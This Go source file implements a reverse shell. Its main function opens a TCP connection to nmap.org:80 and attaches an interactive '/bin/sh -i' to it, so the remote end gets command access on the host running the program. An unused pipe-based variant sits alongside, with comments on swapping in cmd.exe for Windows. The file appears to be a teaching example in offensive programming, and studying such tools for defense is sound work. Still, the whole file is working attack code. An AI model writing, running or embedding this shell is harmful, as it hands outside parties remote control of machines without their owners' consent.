package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// Flusher wraps bufio.Writer, explicity flushing on all writes.
type Flusher struct {
	w *bufio.Writer
}

// NewFlushers creates a new Flusher from an io.Writer.
func NewFlushers(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := foo.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

// Handle function without the use of the Pipe Reader
func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	cmd.Stdin = conn

	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = NewFlushers(conn)

	// Run the command
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func pipeHandle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	conn, err := net.Dial("tcp", "nmap.org:80")
	if err != nil {
		log.Fatalln("Unable to established connection")
	}

	defer conn.Close()

	handle(conn)
}
